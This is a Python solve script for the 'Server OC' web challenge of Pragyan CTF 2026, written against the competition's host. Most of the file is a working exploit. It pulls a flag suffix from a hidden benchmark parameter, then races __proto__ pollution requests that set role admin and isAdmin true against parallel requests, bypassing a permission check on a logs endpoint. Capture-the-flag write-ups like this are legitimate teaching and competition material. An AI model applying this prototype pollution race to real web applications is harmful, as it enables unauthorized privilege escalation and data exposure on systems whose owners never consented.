#!/usr/bin/env python3
"""
Server OC - Pragyan CTF 2026 - Web 500
Solve script by Smothy @ 0xN1umb

Prototype pollution race condition to leak the flag in two parts:
  1. Flag suffix from /benchmark?internal=flag
  2. Flag prefix from /logs via __proto__ pollution race
"""

import requests
import threading
import time

BASE = "https://server-oc.ctf.prgy.in"

def solve():
    print("[*] Server OC - Pragyan CTF 2026 Exploit")
    print("[*] Smothy @ 0xN1umb\n")

    # ── Step 1: Get flag suffix from /benchmark?internal=flag ──
    print("[+] Step 1: Grabbing flag suffix...")
    r = requests.get(f"{BASE}/benchmark?internal=flag", timeout=10)
    suffix = r.text.replace("Flag : ", "")
    print(f"    Suffix: {suffix}")

    # ── Step 2: Find magic overclock multiplier (76) ──
    print("[+] Step 2: Setting overclock to 76x...")
    s = requests.Session()
    r = s.post(f"{BASE}/api/overclock", json={"multiplier": 76}, timeout=10)
    data = r.json()
    assert data["showBe"] == True, "Benchmark not enabled!"
    print(f"    {data['message']}")

    # ── Step 3: Get JWT from /leConfig ──
    print("[+] Step 3: Fetching JWT from /leConfig...")
    s.post(f"{BASE}/leConfig", timeout=10)
    print(f"    JWT token set in cookie")

    # ── Step 4: Prototype pollution race condition ──
    print("[+] Step 4: Racing prototype pollution...")
    prefix = None
    lock = threading.Lock()

    def pollute():
        """Send __proto__ pollution - server will crash but pollution persists"""
        try:
            s.post(f"{BASE}/logs", json={
                "Path": "C:\\Windows\\Log\\systemRestore",
                "__proto__": {"role": "admin", "isAdmin": True, "verified": True}
            }, timeout=10)
        except:
            pass

    def access_logs():
        """Access /logs right after pollution - race the crash recovery"""
        nonlocal prefix
        time.sleep(0.01)
        try:
            s2 = requests.Session()
            s2.post(f"{BASE}/api/overclock", json={"multiplier": 76}, timeout=10)
            s2.post(f"{BASE}/leConfig", timeout=10)
            r = s2.post(f"{BASE}/logs",
                        json={"Path": "C:\\Windows\\Log\\systemRestore"},
                        timeout=10)
            if "Invalid user permissions" not in r.text and "Maximum call stack" not in r.text:
                with lock:
                    if prefix is None:
                        data = r.json()
                        prefix = data.get("message", "")
        except:
            pass

    for attempt in range(50):
        t1 = threading.Thread(target=pollute)
        t2 = threading.Thread(target=access_logs)
        t1.start()
        t2.start()
        t1.join()
        t2.join()

        if prefix:
            print(f"    Got prefix on attempt {attempt + 1}!")
            break
    else:
        print("    [-] Failed after 50 attempts, try again")
        return

    print(f"    Prefix: {prefix}")

    # ── Step 5: Combine flag ──
    flag = prefix + suffix
    print(f"\n[★] FLAG: {flag}")
    print(f"    Decoded: Liquid Helium Should NOT Touch Servers")

if __name__ == "__main__":
    solve()
